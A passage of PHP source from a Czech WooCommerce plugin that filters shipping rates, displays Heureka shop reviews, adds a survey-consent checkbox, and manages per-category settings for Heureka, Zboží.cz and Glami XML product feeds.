        if ( isset( $rates['legacy_local_pickup'] ) ) {
          $local_pickup = $rates['legacy_local_pickup'];
        }
        $rates_omezeno['legacy_free_shipping'] = $free_shipping;
        if ( isset( $local_pickup ) ) {
          $rates_omezeno['legacy_local_pickup'] = $local_pickup;
        }
      }
      $free = $pickup = array();
      foreach ( $rates as $rate_id => $rate ) {
        if ( 'free_shipping' === $rate->method_id ) {
          $rates_omezeno[ $rate_id ] = $rate;
          $free[] = $rate_id;
        }
        if ( 'local_pickup' === $rate->method_id ) {
          $rates_omezeno[ $rate_id ] = $rate;
          $pickup[] = $rate_id;
        }
      }
      if ( empty( $free ) && ! empty( $pickup ) ) {
        foreach ( $pickup as $pickup_id ) {
          unset( $rates_omezeno[ $pickup_id ] );
        }
      }
    }
  }
  if ( ! empty( $rates_omezeno ) ) {
    return $rates_omezeno;
  } else {
    return $rates;
  }
}

function ceske_sluzby_heureka_recenze_obchodu( $atts ) {
  $process = true;
  $output = '<div class=""recenze-zakazniku"">';
  $api = get_option( 'wc_ceske_sluzby_heureka_overeno-api' );
  if ( ! empty( $api ) ) {
    if ( false === ( $source_xml = get_transient( 'ceske_sluzby_heureka_recenze_zakazniku' ) ) ) {
      $url = ""https://www."" . HEUREKA_URL . ""/direct/dotaznik/export-review.php?key="" . $api;
      $response = wp_remote_get( $url );
      if ( ! is_wp_error( $response ) ) {
        $source_xml = wp_remote_retrieve_body( $response );
        if ( ! empty( $source_xml ) && wp_remote_retrieve_response_code( $response ) == 200 ) {
          set_transient( 'ceske_sluzby_heureka_recenze_zakazniku', $source_xml, 24 * HOUR_IN_SECONDS );
        } else {
          $process = false;
        }
      } else {
        $output .= 'Nepodařilo se získat data:' . $response->get_error_message();
      }
    }

    if ( $process ) {
      $recenze_xml = simplexml_load_string( $source_xml, 'SimpleXMLElement', LIBXML_NOCDATA );
      $atributy = shortcode_atts( array( 'limit' => null ), $atts );
      $limit = $atributy['limit'];
      $i = 0;

      if ( ! empty( $recenze_xml ) && ! is_scalar( $recenze_xml ) ) {
        foreach( $recenze_xml as $recenze ) {
          if ( ( ! empty( $limit ) && $i < $limit ) || empty( $limit ) ) {
            if ( ! empty( $recenze->summary ) ) {
              $i = $i + 1;
              $output .= '<ul>';
              $output .= '<li>';
              $output .= '<strong>' . $recenze->summary . '</strong><br />';
              if ( ! empty( $recenze->total_rating ) ) {
                $output .= 'Hodnocení: ' . $recenze->total_rating . '/5 | ';
              }
              $output .= 'Datum: před ' . human_time_diff( $recenze->unix_timestamp );
              if ( ! empty( $recenze->name ) ) {
                $output .= ' | Autor: ' . $recenze->name;
              } 
              $output .= '</li>';
              $output .= '</ul>';
            }
          }
          else {
            break;
          }
        }
      }
      else {
        $output .= 'Zatím žádné hodnocení.';
      }
    } else {
      $output .= 'Nepodařilo se získat data.';
    }
  } else {
    $output .= 'Pro zobrazení recenzí musíte ještě <a href=""' . admin_url(). 'admin.php?page=wc-settings&tab=ceske-sluzby"">zadat</a> API klíč pro Ověřeno zákazníky.';
  }
  $output .= '</div>';
  return $output;
}

function ceske_sluzby_heureka_overeno_zakazniky_souhlas() {
  $api = get_option( 'wc_ceske_sluzby_heureka_overeno-api' );
  $souhlas = get_option( 'wc_ceske_sluzby_heureka_overeno-souhlas' );
  if ( ! empty( $api ) ) {
    if ( $souhlas == 'nesouhlas_optout' ) {
      woocommerce_form_field( 'heureka_overeno_zakazniky_nesouhlas_optout',
        array(
          'type' => 'checkbox',
          'label' => 'Nesouhlasím se zasláním dotazníku spokojenosti v rámci programu Ověřeno zákazníky (Heureka), který pomáhá zlepšovat naše služby.',
        )
      );
    }
    if ( $souhlas == 'souhlas_optout' ) {
      woocommerce_form_field( 'heureka_overeno_zakazniky_souhlas_optout',
        array(
          'type' => 'checkbox',
          'label' => 'Souhlasím se zasláním dotazníku spokojenosti v rámci programu Ověřeno zákazníky (Heureka), který pomáhá zlepšovat naše služby.',
        ), 1 
      );
    }
  }
}

function ceske_sluzby_xml_kategorie_pridat_pole() {
  $global_data = ceske_sluzby_xml_ziskat_globalni_hodnoty();
  $xml_feed_heureka = get_option( 'wc_ceske_sluzby_xml_feed_heureka-aktivace' );
  $xml_feed_zbozi = get_option( 'wc_ceske_sluzby_xml_feed_zbozi-aktivace' );
  $xml_feed_glami = get_option( 'wc_ceske_sluzby_xml_feed_glami-aktivace' );
  if ( $xml_feed_heureka == ""yes"" ) { ?>
    <div style=""font-size: 14px; font-weight: bold;"">České služby: Heureka</div>
    <div class=""form-field"">
      <label for=""ceske-sluzby-xml-heureka-kategorie"">Kategorie</label>
      <input name=""ceske-sluzby-xml-heureka-kategorie"" id=""ceske-sluzby-xml-heureka-kategorie"" type=""text"" value="""" placeholder=""CATEGORYTEXT"" size=""70""/>
      <p>
        Zatím je nutné doplnit příslušnou kategorii z Heureky ručně (aktuální přehled naleznete <a href=""https://www.<?php echo HEUREKA_URL; ?>/direct/xml-export/shops/heureka-sekce.xml"">zde</a>).<br />
        Příklad: <strong>Elektronika | Počítače a kancelář | Software | Antiviry</strong><br />
        Poznámka: Z <code>CATEGORY_FULLNAME</code> je třeba vynechat část <code><?php echo ucfirst( HEUREKA_URL ); ?> | </code>.
      </p>
    </div>
    <?php if ( empty( $global_data['nazev_produktu'] ) || strpos( $global_data['nazev_produktu'], '{KATEGORIE}' ) !== false ) { ?>
      <div class=""form-field"">
        <label for=""ceske-sluzby-xml-heureka-productname"">Název produktů</label>
        <input name=""ceske-sluzby-xml-heureka-productname"" id=""ceske-sluzby-xml-heureka-productname"" type=""text"" value="""" placeholder=""PRODUCTNAME"" size=""70""/>
        <p>
          Pomocí placeholderů můžete doplnit obecný název pro všechny produkty z příslušné kategorie Heureky (aktuální přehled naleznete <a href=""https://sluzby.<?php echo HEUREKA_URL; ?>/napoveda/povinne-nazvy/"" target=""_blank"">zde</a>).<br />
          Příklad (Svatební dekorace): <strong>Výrobce | Druh | Barva</strong><br />
          Pokud používáte nastavení výrobce, druh máte jako název produktu a barvu zase uloženou jako vlastnost v podobě taxonomie, tak můžete zadat: <code>{MANUFACTURER} {NAZEV} {pa_barva}</code>
        </p>
      </div>
    <?php } ?>
  <?php }
  if ( $xml_feed_zbozi == ""yes"" ) { ?>
    <div style=""font-size: 14px; font-weight: bold;"">České služby: Zboží.cz</div>
    <div class=""form-field"">
      <label for=""ceske-sluzby-xml-zbozi-kategorie"">Kategorie</label>
      <input name=""ceske-sluzby-xml-zbozi-kategorie"" id=""ceske-sluzby-xml-zbozi-kategorie"" type=""text"" value="""" placeholder=""CATEGORYTEXT"" size=""70"" />
      <p>
        Zatím je nutné doplnit příslušnou kategorii ze Zbozi.cz ručně (aktuální přehled naleznete <a href=""https://www.zbozi.cz/static/categories.csv"">zde</a>).<br />
        Příklad: <strong>Počítače | Software | Grafický a video software</strong><br />
      </p>
    </div>
    <?php if ( empty( $global_data['nazev_produktu'] ) || strpos( $global_data['nazev_produktu'], '{KATEGORIE}' ) !== false ) { ?>
      <div class=""form-field"">
        <label for=""ceske-sluzby-xml-zbozi-productname"">Název produktů</label>
        <input name=""ceske-sluzby-xml-zbozi-productname"" id=""ceske-sluzby-xml-zbozi-productname"" type=""text"" value="""" placeholder=""PRODUCTNAME"" size=""70"" />
        <p>
          Pomocí placeholderů můžete doplnit obecný název pro všechny produkty z příslušné kategorie Zboží.cz (aktuální přehled naleznete <a href=""https://napoveda.seznam.cz/cz/zbozi/specifikace-xml-pro-obchody/pravidla-pojmenovani-nabidek/"" target=""_blank"">zde</a>).<br />
          Příklad pro konrétní kategorii: <strong>Výrobce | Druh | Barva</strong><br />
          Pokud používáte nastavení výrobce, druh máte jako název produktu a barvu zase uloženou jako vlastnost v podobě taxonomie, tak můžete zadat: <code>{MANUFACTURER} {NAZEV} {pa_barva}</code>
        </p>
      </div>
    <?php }
    $extra_message_aktivace = get_option( 'wc_ceske_sluzby_xml_feed_zbozi_extra_message-aktivace' );
    if ( ! empty( $extra_message_aktivace ) ) {
      $extra_message_array = ceske_sluzby_ziskat_nastaveni_zbozi_extra_message();
      foreach ( $extra_message_aktivace as $extra_message ) {
        if ( array_key_exists( $extra_message, $global_data['extra_message'] ) ) { ?>
          <div class=""form-field"">
            <label for=""ceske-sluzby-xml-zbozi-extra-message[<?php echo $extra_message; ?>]""><?php echo $extra_message_array[ $extra_message ]; ?></label>
            <span>
              Není potřeba nic zadávat, protože na úrovni eshopu je tato informace <a href=""<?php echo admin_url(); ?>admin.php?page=wc-settings&tab=ceske-sluzby&section=xml-feed"">nastavena</a> globálně pro všechny produkty.
            </span>
          </div>
        <?php } else { ?>
          <div class=""form-field"">
            <label for=""ceske-sluzby-xml-zbozi-extra-message[<?php echo $extra_message; ?>]""><?php echo $extra_message_array[ $extra_message ]; ?></label>
            <input name=""ceske-sluzby-xml-zbozi-extra-message[<?php echo $extra_message; ?>]"" id=""ceske-sluzby-xml-zbozi-extra-message[<?php echo $extra_message; ?>]"" type=""checkbox"" value=""yes"" />
            <span>
              Po zaškrtnutí budou produkty v příslušné kategorii označeny příslušnou doplňkovou informací. Na úrovni eshopu zatím není nic <a href=""<?php echo admin_url(); ?>admin.php?page=wc-settings&tab=ceske-sluzby&section=xml-feed"">nastaveno</a>.
            </span>
          </div>
        <?php } ?>
      <?php }
    }
  }
  if ( $xml_feed_glami == ""yes"" ) { ?>
    <div style=""font-size: 14px; font-weight: bold;"">České služby: Glami</div>
    <div class=""form-field"">
      <label for=""ceske-sluzby-xml-glami-kategorie"">Kategorie</label>
      <input name=""ceske-sluzby-xml-glami-kategorie"" id=""ceske-sluzby-xml-glami-kategorie"" type=""text"" value="""" placeholder=""CATEGORYTEXT"" size=""70""/>
      <p>
        Zatím je nutné doplnit příslušnou kategorii z Glami ručně (aktuální přehled naleznete <a href=""https://www.<?php echo GLAMI_URL; ?>/category-xml/"">zde</a>).<br />
        Příklad: <strong>Dámské oblečení a obuv | Dámské boty | Dámské outdoorové boty</strong><br />
        Poznámka: Z <code>CATEGORY_FULLNAME</code> je třeba vynechat část <code><?php echo ucfirst( GLAMI_URL ); ?> | </code>.
      </p>
    </div>
  <?php } ?>
  <div style=""font-size: 14px; font-weight: bold;"">České služby: XML feedy</div>
  <div class=""form-field"">
    <label for=""ceske-sluzby-xml-vynechano"">Odebrat z XML</label>
    <input name=""ceske-sluzby-xml-vynechano"" id=""ceske-sluzby-xml-vynechano"" type=""checkbox"" value=""yes"" />
    <strong><span style=""padding-right: 10px;"">Vše</span></strong>
      <?php $feeds = ceske_sluzby_prehled_xml_feedu();
      foreach ( $feeds as $feed_id => $feed_name ) { ?>
        <input name=""ceske-sluzby-xml-feed-vynechano[<?php echo $feed_id; ?>]"" id=""ceske-sluzby-xml-feed-vynechano[<?php echo $feed_id; ?>]"" type=""checkbox"" value=""yes"" <?php checked( isset( $xml_feed_vynechano_ulozeno[$feed_id] ) ? $xml_feed_vynechano_ulozeno[$feed_id] : '', ""yes"" ); ?>/>
        <span style=""padding-right: 10px;""><?php echo $feed_name; ?></span>
      <?php } ?>
    <p>
      Zaškrtněte pokud chcete odebrat produkty této kategorie z XML feedů.
    </p>
  </div>
  <?php
  if ( ! empty( $global_data['stav_produktu'] ) ) {
    if ( $global_data['stav_produktu'] == 'used' ) {
      $stav_produkt_hodnota = 'Použité (bazar)';
    } else {
      $stav_produkt_hodnota = 'Repasované';
    }
    $stav_produkt_text = 'Na úrovni eshopu je <a href=""' . admin_url(). 'admin.php?page=wc-settings&tab=ceske-sluzby&section=xml-feed"">nastavena</a> hodnota: <strong>' . $stav_produkt_hodnota . '</strong>. Nastavení kategorie bude mít ale přednost.';
  } else {
    $stav_produkt_text = 'Na úrovni eshopu zatím není nic <a href=""' . admin_url(). 'admin.php?page=wc-settings&tab=ceske-sluzby&section=xml-feed"">nastaveno</a>.';
  } ?>
  <div class=""form-field"">
    <label for=""ceske-sluzby-xml-stav-produktu"">Stav produktů</label>
    <select id=""ceske-sluzby-xml-stav-produktu"" name=""ceske-sluzby-xml-stav-produktu"" class=""postform"">
      <option value="""">- Vyberte -</option>
      <option value=""used"">Použité (bazar)</option>
      <option value=""refurbished"">Repasované</option>
    </select>
    <span>
      <?php echo $stav_produkt_text; ?>
    </span>
  </div>
  <div class=""form-field"">
    <label for=""ceske-sluzby-xml-erotika"">Erotický obsah</label>
    <input name=""ceske-sluzby-xml-erotika"" id=""ceske-sluzby-xml-erotika"" type=""checkbox"" value=""yes"" />
    <span>
      Zaškrtněte pokud chcete označit obsah webu jako erotický.
    </span>
  </div>
<?php
}

function ceske_sluzby_xml_kategorie_upravit_pole( $term ) {
  $checked = '';
  $global_data = ceske_sluzby_xml_ziskat_globalni_hodnoty();
  $heureka_kategorie = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-heureka-kategorie', true );
  $heureka_productname = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-heureka-productname', true );
  $zbozi_kategorie = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-zbozi-kategorie', true );
  $zbozi_productname = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-zbozi-productname', true );
  $glami_kategorie = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-glami-kategorie', true );
  $kategorie_extra_message_ulozeno = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-zbozi-extra-message', true );
  $xml_vynechano_ulozeno = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-vynechano', true );
  $xml_feed_vynechano_ulozeno = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-feed-vynechano', true );
  $xml_erotika_ulozeno = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-erotika', true );
  $xml_stav_produktu = get_woocommerce_term_meta( $term->term_id, 'ceske-sluzby-xml-stav-produktu', true );
  $xml_feed_heureka = get_option( 'wc_ceske_sluzby_xml_feed_heureka-aktivace' );
  $xml_feed_zbozi = get_option( 'wc_ceske_sluzby_xml_feed_zbozi-aktivace' );
  $xml_feed_glami = get_option( 'wc_ceske_sluzby_xml_feed_glami-aktivace' );
  if ( $xml_feed_heureka == ""yes"" ) { ?>
    <tr>
      <th scope=""row"" valign=""top""><strong>České služby: Heureka</strong></th>
    </tr>
    <tr class=""form-field"">
      <th scope=""row"" valign=""top""><label>Kategorie</label></th>
      <td> 
        <input name=""ceske-sluzby-xml-heureka-kategorie"" id=""ceske-sluzby-xml-heureka-kategorie"" type=""text"" value=""<?php echo esc_attr( $heureka_kategorie ); ?>"" placeholder=""CATEGORYTEXT"" />
        <p class=""description"">
          Zatím je nutné doplnit příslušnou kategorii z Heureky ručně (aktuální přehled naleznete <a href=""http://www.<?php echo HEUREKA_URL; ?>/direct/xml-export/shops/heureka-sekce.xml"">zde</a>).<br />
          Příklad: <strong>Elektronika | Počítače a kancelář | Software | Antiviry</strong><br />
          Poznámka: Z <code>CATEGORY_FULLNAME</code> je třeba vynechat část <code><?php echo ucfirst( HEUREKA_URL ); ?> | </code>.
        </p>
      </td>
    </tr>
    <?php if ( empty( $global_data['nazev_produktu'] ) || strpos( $global_data['nazev_produktu'], '{KATEGORIE}' ) !== false ) { ?>
      <tr class=""form-field"">
        <th scope=""row"" valign=""top""><label>Název produktů</label></th>
        <td> 
          <input name=""ceske-sluzby-xml-heureka-productname"" id=""ceske-sluzby-xml-heureka-productname"" type=""text"" value=""<?php echo esc_attr( $heureka_productname ); ?>"" placeholder=""PRODUCTNAME"" />
            <p class=""description"">
              Pomocí placeholderů můžete doplnit obecný název pro všechny produkty z příslušné kategorie Heureky (aktuální přehled naleznete <a href=""http://sluzby.<?php echo HEUREKA_URL; ?>/napoveda/povinne-nazvy/"" target=""_blank"">zde</a>).<br />
              Příklad (Svatební dekorace): <strong>Výrobce | Druh | Barva</strong><br />
              Pokud používáte nastavení výrobce, druh máte jako název produktu a barvu zase uloženou jako vlastnost v podobě taxonomie, tak můžete zadat: <code>{MANUFACTURER} {NAZEV} {pa_barva}</code>
            </p>
        </td>
      </tr>
    <?php } ?>
  <?php }
  if ( $xml_feed_zbozi == ""yes"" ) { ?>
    <tr>
      <th scope=""row"" valign=""top""><strong>České služby: Zboží.cz</strong></th>
    </tr>
    <tr class=""form-field"">
      <th scope=""row"" valign=""top""><label>Kategorie</label></th>
      <td> 
        <input name=""ceske-sluzby-xml-zbozi-kategorie"" id=""ceske-sluzby-xml-zbozi-kategorie"" type=""text"" value=""<?php echo esc_attr( $zbozi_kategorie ); ?>"" placeholder=""CATEGORYTEXT"" />
        <p class=""description"">
          Zatím je nutné doplnit příslušnou kategorii ze Zbozi.cz ručně (aktuální přehled naleznete <a href=""http://www.zbozi.cz/static/categories.csv"">zde</a>).<br />
          Příklad: <strong>Počítače | Software | Grafický a video software</strong><br />
        </p>
      </td>
    </tr>
    <?php if ( empty( $global_data['nazev_produktu'] ) || strpos( $global_data['nazev_produktu'], '{KATEGORIE}' ) !== false ) { ?>
      <tr class=""form-field"">
        <th scope=""row"" valign=""top""><label>Název produktů</label></th>
        <td> 
          <input name=""ceske-sluzby-xml-zbozi-productname"" id=""ceske-sluzby-xml-zbozi-productname"" type=""text"" value=""<?php echo esc_attr( $zbozi_productname ); ?>"" placeholder=""PRODUCTNAME"" />
            <p class=""description"">
              Pomocí placeholderů můžete doplnit obecný název pro všechny produkty z příslušné kategorie Zboží.cz (aktuální přehled naleznete <a href=""http://napoveda.seznam.cz/cz/zbozi/specifikace-xml-pro-obchody/pravidla-pojmenovani-nabidek/"" target=""_blank"">zde</a>).<br />
              Příklad pro konrétní kategorii: <strong>Výrobce | Druh | Barva</strong><br />
              Pokud používáte nastavení výrobce, druh máte jako název produktu a barvu zase uloženou jako vlastnost v podobě taxonomie, tak můžete zadat: <code>{MANUFACTURER} {NAZEV} {pa_barva}</code>
            </p>
        </td>
      </tr>
    <?php }
    $extra_message_aktivace = get_option( 'wc_ceske_sluzby_xml_feed_zbozi_extra_message-aktivace' );
    if ( ! empty( $extra_message_aktivace ) ) {
      $extra_message_array = ceske_sluzby_ziskat_nastaveni_zbozi_extra_message();
      foreach ( $extra_message_aktivace as $extra_message ) {
        if ( array_key_exists( $extra_message, $global_data['extra_message'] ) ) {
          $extra_message_text = ''; ?>
          <tr class=""form-field"">
            <th scope=""row"" valign=""top""><label><?php echo $extra_message_array[ $extra_message ]; ?></label></th>
            <td> 
              <span class=""description"">
                Není potřeba nic zadávat, protože na úrovni eshopu je tato informace <a href=""<?php echo admin_url(); ?>admin.php?page=wc-settings&tab=ceske-sluzby&section=xml-feed"">nastavena</a> globálně pro všechny produkty.
              </span>
            </td>
          </tr>
        <?php } else {
          $checked = """";
          if ( ! empty( $kategorie_extra_message_ulozeno ) && array_key_exists( $extra_message, $kategorie_extra_message_ulozeno ) ) {
            $checked = 'checked=""checked""';
          } ?>
          <tr class=""form-field"">
            <th scope=""row"" valign=""top""><label><?php echo $extra_message_array[ $extra_message ]; ?></label></th>
            <td> 
              <input name=""ceske-sluzby-xml-zbozi-extra-message[<?php echo $extra_message; ?>]"" id=""ceske-sluzby-xml-zbozi-extra-message[<?php echo $extra_message; ?>]"" type=""checkbox"" value=""yes"" <?php echo $checked; ?>/>
              <span class=""description"">
                Po zaškrtnutí budou produkty v příslušné kategorii označeny příslušnou doplňkovou informací. Na úrovni eshopu zatím není nic <a href=""<?php echo admin_url(); ?>admin.php?page=wc-settings&tab=ceske-sluzby&section=xml-feed"">nastaveno</a>.
              </span>
            </td>
          </tr>
        <?php }
      }
    }
  }
  if ( $xml_feed_glami == ""yes"" ) { ?>
    <tr>
      <th scope=""row"" valign=""top""><strong>České služby: Glami</strong></th>
    </tr>
    <tr class=""form-field"">
      <th scope=""row"" valign=""top""><label>Kategorie</label></th>
      <td> 
        <input name=""ceske-sluzby-xml-glami-kategorie"" id=""ceske-sluzby-xml-glami-kategorie"" type=""text"" value=""<?php echo esc_attr( $glami_kategorie ); ?>"" placeholder=""CATEGORYTEXT"" />
        <p class=""description"">
          Zatím je nutné doplnit příslušnou kategorii z Glami ručně (aktuální přehled naleznete <a href=""http://www.<?php echo GLAMI_URL; ?>/category-xml/"">zde</a>).<br />
          Příklad: <strong>Dámské oblečení a obuv | Dámské boty | Dámské outdoorové boty</strong><br />
          Poznámka: Z <code>CATEGORY_FULLNAME</code> je třeba vynechat část <code><?php echo ucfirst( GLAMI_URL ); ?> | </code>.
        </p>
      </td>
    </tr>
  <?php } ?>
  <tr>
    <th scope=""row"" valign=""top""><strong>České služby: XML feedy</strong></th>
  </tr>
  <tr class=""form-field"">
    <th scope=""row"" valign=""top""><label>Odebrat z XML</label></th>
    <td> 
      <input name=""ceske-sluzby-xml-vynechano"" id=""ceske-sluzby-xml-vynechano"" type=""checkbox"" value=""yes"" <?php checked( $xml_vynechano_ulozeno, ""yes"" ); ?>/>
      <strong><span class=""description"" style=""padding-right: 10px;"">Vše</span></strong>
      <?php $feeds = ceske_sluzby_prehled_xml_feedu();
      foreach ( $feeds as $feed_id => $feed_name ) { ?>
        <input name=""ceske-sluzby-xml-feed-vynechano[<?php echo $feed_id; ?>]"" id=""ceske-sluzby-xml-feed-vynechano[<?php echo $feed_id; ?>]"" type=""checkbox"" value=""yes"" <?php checked( isset( $xml_feed_vynechano_ulozeno[$feed_id] ) ? $xml_feed_vynechano_ulozeno[$feed_id] : '', ""yes"" ); ?>/>
        <span class=""description"" style=""padding-right: 10px;""><?php echo $feed_name; ?></span>
      <?php } ?>
      <p class=""description"">
        Zaškrtněte pokud chcete odebrat produkty této kategorie z XML feedů.
      </span>
    </td>
  </tr>
  <?php
  if ( ! empty( $global_data['stav_produktu'] ) ) {
    if ( $global_data['stav_produktu'] == 'used' ) {
      $stav_produkt_hodnota = 'Použité (bazar)';
    } else {
      $stav_produkt_hodnota = 'Repasované';
    }
    $stav_produkt_text = 'Na úrovni eshopu je <a href=""' . admin_url(). 'admin.php?page=wc-settings&tab=ceske-sluzby&section=xml-feed"">nastavena</a> hodnota: <strong>' . $stav_produkt_hodnota . '</strong>. Nastavení kategorie bude mít ale přednost.';
  } else {
    $stav_produkt_text = 'Na úrovni eshopu zatím není nic <a href=""' . admin_url(). 'admin.php?page=wc-settings&tab=ceske-sluzby&section=xml-feed"">nastaveno</a>.';
  } ?>
  <tr class=""form-field"">
    <th scope=""row"" valign=""top""><label>Stav produktů</label></th>
    <td>
      <select id=""ceske-sluzby-xml-stav-produktu"" name=""ceske-sluzby-xml-stav-produktu"" class=""postform"">
        <option value="""" <?php selected( '', $xml_stav_produktu ); ?>>- Vyberte -</option>
        <option value=""used"" <?php selected( 'used', $xml_stav_produktu ); ?>>Použité (bazar)</option>
        <option value=""refurbished"" <?php selected( 'refurbished', $xml_stav_produktu ); ?>>Repasované</option>
      </select>
      <span class=""description"">
        <?php echo $stav_produkt_text; ?>
      </span>
    </td>
  </tr>
  <tr class=""form-field"">
    <th scope=""row"" valign=""top""><label>Erotický obsah</label></th>
    <td> 
      <input name=""ceske-sluzby-xml-erotika"" id=""ceske-sluzby-xml-erotika"" type=""checkbox"" value=""yes"" <?php checked( $xml_erotika_ulozeno, ""yes"" ); ?>/>
      <span class=""description"">
        Zaškrtněte pokud chcete označit obsah webu jako erotický.
      </span>
    </td>
  </tr>
<?php // http://themehybrid.com/weblog/introduction-to-wordpress-term-meta
}

function ceske_sluzby_xml_kategorie_ulozit( $term_id, $tt_id = '', $taxonomy = '' ) {
  if ( 'product_cat' === $taxonomy ) {
    $ukladana_data_text = array(
      'ceske-sluzby-xml-heureka-kategorie',
      'ceske-sluzby-xml-heureka-productname',
      'ceske-sluzby-xml-zbozi-kategorie',
      'ceske-sluzby-xml-zbozi-productname',
      'ceske-sluzby-xml-glami-kategorie',
      'ceske-sluzby-xml-stav-produktu'
    );
    foreach ( $ukladana_data_text as $key ) {
      if ( isset( $_POST[ $key ] ) ) {
        $value = $_POST[ $key ];
        if ( $key == 'ceske-sluzby-xml-heureka-kategorie' ) {
          $value = str_replace( 'Heureka.cz | ', '', $value );
          $value = str_replace( 'Heureka.sk | ', '', $value );
        }
        if ( $key == 'ceske-sluzby-xml-glami-kategorie' ) {
          $value = str_replace( 'Glami.cz | ', '', $value );
          $value = str_replace( 'Glami.sk | ', '', $value );
        }
        $ulozeno_text = get_woocommerce_term_meta( $term_id, $key, true );
        if ( ! empty( $value ) ) {
          update_woocommerce_term_meta( $term_id, $key, esc_attr( $value ) );
        } elseif ( ! empty( $ulozeno_text ) ) {
          delete_woocommerce_term_meta( $term_id, $key ); 
        }
      }
    }

    $ukladana_data_checkbox = array(
      'ceske-sluzby-xml-vynechano',
      'ceske-sluzby-xml-feed-vynechano',
      'ceske-sluzby-xml-erotika',
      'ceske-sluzby-xml-zbozi-extra-message'
    );
    foreach ( $ukladana_data_checkbox as $key ) {
      $ulozeno_checkbox = get_woocommerce_term_meta( $term_id, $key, true );
      if ( isset( $_POST[ $key ] ) ) {
        $value = $_POST[ $key ];
        if ( ! empty( $value ) ) {
          update_woocommerce_term_meta( $term_id, $key, $value );
        }
      } elseif ( ! empty( $ulozeno_checkbox ) ) {
        delete_woocommerce_term_meta( $term_id, $key ); 
      }
    }
  }
}

function ceske_sluzby_xml_kategorie_pridat_sloupec( $columns ) {
  $new_columns = array();
  $new_columns['xml-heureka'] = 'Nastavení XML';
  return array_merge( $columns, $new_columns );
}

function ceske_sluzby_xml_kategorie_sloupec( $columns, $column, $id ) {
  if ( 'xml-heureka' == $column ) {
    $heureka_kategorie = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-heureka-kategorie', true );
    $heureka_nazev = false;
    if ( $heureka_kategorie ) {
      $columns .= 'Heureka: <a href=""#"" title=""' . $heureka_kategorie . '"">KA</a>';
      $heureka_nazev = true;
    }
    $heureka_productname = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-heureka-productname', true );
    if ( $heureka_productname ) {
      if ( $heureka_nazev ) {
        $columns .= ' <a href=""#"" title=""' . $heureka_productname . '"">PR</a>';
      } else {
        $columns .= 'Heureka: <a href=""#"" title=""' . $heureka_productname . '"">PR</a>';
        $heureka_nazev = true;
      }
    }
    if ( $heureka_nazev ) {
      $columns .= '<br />';
    }
    $zbozi_kategorie = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-zbozi-kategorie', true );
    $zbozi_nazev = false;
    if ( $zbozi_kategorie ) {
      $columns .= 'Zboží: <a href=""#"" title=""' . $zbozi_kategorie . '"">KA</a>';
      $zbozi_nazev = true;
    }
    $zbozi_productname = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-zbozi-productname', true );
    if ( $zbozi_productname ) {
      if ( $zbozi_nazev ) {
        $columns .= ' <a href=""#"" title=""' . $zbozi_productname . '"">PR</a>';
      } else {
        $columns .= 'Zboží: <a href=""#"" title=""' . $zbozi_productname . '"">PR</a>';
        $zbozi_nazev = true;
      }
    }
    $glami_kategorie = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-glami-kategorie', true );
    $extra_message_aktivace = get_option( 'wc_ceske_sluzby_xml_feed_zbozi_extra_message-aktivace' );
    $kategorie_extra_message_ulozeno = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-zbozi-extra-message', true );
    if ( ! empty( $kategorie_extra_message_ulozeno ) ) {
      $extra_message_array = ceske_sluzby_ziskat_nastaveni_zbozi_extra_message();
      foreach ( $kategorie_extra_message_ulozeno as $key => $value ) {
        if ( ! empty( $extra_message_aktivace ) && in_array( $key, $extra_message_aktivace ) ) {
          $kategorie_extra_message[] = $extra_message_array[ $key ];
        }
      }
      if ( ! empty( $kategorie_extra_message ) ) {
        $kategorie_extra_message_text = implode( ', ', $kategorie_extra_message );
        if ( $zbozi_nazev ) {
          $columns .= ' <a href=""#"" title=""' . $kategorie_extra_message_text . '"">EM</a>';
        } else {
          $columns .= 'Zboží: <a href=""#"" title=""' . $kategorie_extra_message_text . '"">EM</a>';
        }
      }
    }
    if ( $glami_kategorie ) {
      if ( ! empty( $columns ) ) {
        $columns .= '<br />';
      }
      $columns .= 'Glami: <a href=""#"" title=""' . $glami_kategorie . '"">KA</a>';
    }
    $kategorie_vynechano = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-vynechano', true );
    $kategorie_feed_vynechano = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-feed-vynechano', true );
    if ( $kategorie_vynechano ) {
      $columns .= '<span style=""margin-left: 10px; color: red; font-weight: bold;"">X</span>';
    } elseif ( $kategorie_feed_vynechano ) {
      $feeds = ceske_sluzby_prehled_xml_feedu();
      $title = ' title=""';
      $i = 0;
      foreach ( $kategorie_feed_vynechano as $feed => $value ) {
        if ( $i == 0 ) {
          $title .= $feeds[$feed];
        } else {
          $title .= ', ' . $feeds[$feed];
        };
        $i = $i + 1;
      }
      $title .= '""';
      $columns .= '<span style=""margin-left: 10px; color: red;""' . $title . '>x</span>';
    }
    $stav_produktu = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-stav-produktu', true );
    if ( ! empty( $stav_produktu ) ) {
      if ( $stav_produktu == 'used' ) {
        $stav_produktu_hodnota = 'Použité (bazar)';
      } else {
        $stav_produktu_hodnota = 'Repasované';
      }
      $columns .= '<br />' . $stav_produktu_hodnota;
    }
    $erotika = get_woocommerce_term_meta( $id, 'ceske-sluzby-xml-erotika', true );
    if ( $erotika ) {
      if ( $erotika == 'yes' ) {
        $erotika_hodnota = 'Erotický obsah';
      }
      $columns .= '<br />' . $erotika_hodnota;
    }
  }
  return $columns;
}

function ceske_sluzby_zobrazit_dodaci_dobu_filtr( $availability, $product ) {
  if ( ! $product->is_in_stock() ) {
    $dostupnost = ceske_sluzby_ziskat_zadanou_dodaci_dobu( """", 99 );
    if ( ! empty( $dostupnost ) ) {
